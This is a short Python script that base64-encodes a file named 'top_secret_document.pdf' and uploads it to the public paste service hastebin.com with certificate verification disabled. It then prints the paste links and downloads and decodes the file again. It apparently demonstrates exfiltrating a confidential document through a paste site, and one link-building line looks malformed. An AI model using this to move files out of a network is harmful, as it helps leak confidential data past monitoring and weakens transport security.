#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import base64
import json

requests.packages.urllib3.disable_warnings()  # Disable SSL verify warnings

URL = 'https://hastebin.com/documents/'
FILENAME_INPUT = 'top_secret_document.pdf'
FILENAME_OUTPUT = 'top_secret_document_decoded.pdf'

with open(FILENAME_INPUT, 'rb') as file_input, open(FILENAME_OUTPUT, 'wb') as file_output:
    print(f'[XXX] Sending File [XXX]')
    print(f'[+] Reading {FILENAME_INPUT}')
    encoded_file = base64.b64encode(file_input.read())
    print(f'[+] {FILENAME_INPUT} encoded in Base64')
    r = requests.post(URL, data=encoded_file, verify=False)
    link_file = json.loads(r.text)
    print(f'[+] Or this link: {"".join(URL.split("d")[:1]) + link_file["key"]}')
    print(f'[+] Access this link: {URL + link_file["key"]}')

    print(f'\n[XXX] Retrieving File [XXX]')
    r = requests.get(URL + link_file["key"], verify=False)
    print(f'[+] Fetching {URL + link_file["key"]}')
    file_encoded = json.loads(r.text)
    print(f'[+] Decoding in Base64')
    decoded_file = base64.b64decode(file_encoded['data'])
    print(f'[+] Writing in file {FILENAME_OUTPUT}')
    file_output.write(decoded_file)
    print(f'[+] Done!!!')
